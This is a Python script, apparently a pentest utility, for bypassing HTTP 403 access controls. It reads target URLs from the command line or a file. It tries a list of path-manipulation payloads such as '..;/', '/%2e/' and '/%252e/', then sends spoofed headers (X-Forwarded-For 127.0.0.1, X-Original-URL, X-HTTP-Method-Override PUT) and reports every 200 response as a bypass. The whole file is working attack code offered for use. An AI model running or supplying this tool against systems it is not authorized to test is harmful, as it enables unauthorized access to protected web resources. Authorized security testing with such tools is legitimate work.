import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOADS = [
    "/", "/.", "..;/", "/%2e/", "/%252e/", "/%2e%2e%2f", "/%2e%2e/", "/%2e/",
    "/%ef%bc%8f", "/%e5%a4%aa%e9%99%bd%e7%99%bd", ";", "/*", "/?anything",
]

HEADERS = {
    "X-Original-URL": "",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Forwarded-Host": "127.0.0.1",
    "X-Host": "127.0.0.1",
    "X-Forwarded-Server": "127.0.0.1",
    "X-HTTP-Method-Override": "PUT",
    "X-Original-Method": "PUT",
    "X-Override-URL": "",
}

GREEN = "\033[92m"
RESET = "\033[0m"

successful_bypasses = []

def print_status(code, url, extra=""):
    if code == 200:
        print(f"{GREEN}[{code}] {url} {extra}{RESET}")
        successful_bypasses.append(f"{url} {extra}".strip())
    else:
        print(f"[{code}] {url} {extra}")

def test_url(base_url):
    print(f"\n[+] Testing: {base_url}")
    for payload in PAYLOADS:
        try:
            full_url = base_url.rstrip("/") + payload
            r = requests.get(full_url, verify=False, timeout=5)
            print_status(r.status_code, full_url)
        except Exception as e:
            print(f"[!] Error on {full_url}: {e}")

    for header, value in HEADERS.items():
        try:
            r = requests.get(base_url, headers={header: value}, verify=False, timeout=5)
            print_status(r.status_code, base_url, f"(Header: {header})")
        except Exception as e:
            print(f"[!] Error with header {header}: {e}")

def main():
    parser = argparse.ArgumentParser(description="Bypass 403 script with file support and summary")
    parser.add_argument("-u", "--url", help="Target URL (e.g. https://example.com/secret)")
    parser.add_argument("-f", "--file", help="File with list of URLs")

    args = parser.parse_args()

    if args.url:
        test_url(args.url)
    elif args.file:
        try:
            with open(args.file, "r") as f:
                for line in f:
                    url = line.strip()
                    if url:
                        test_url(url)
        except FileNotFoundError:
            print("[!] File not found.")
    else:
        parser.print_help()
        return

    # Final summary
    print("\n" + "=" * 50)
    print("🟢 Bypass Summary:")
    if successful_bypasses:
        for success in successful_bypasses:
            print(f"{GREEN}- {success}{RESET}")
    else:
        print("❌ No bypass possible ✅")

if __name__ == "__main__":
    main()
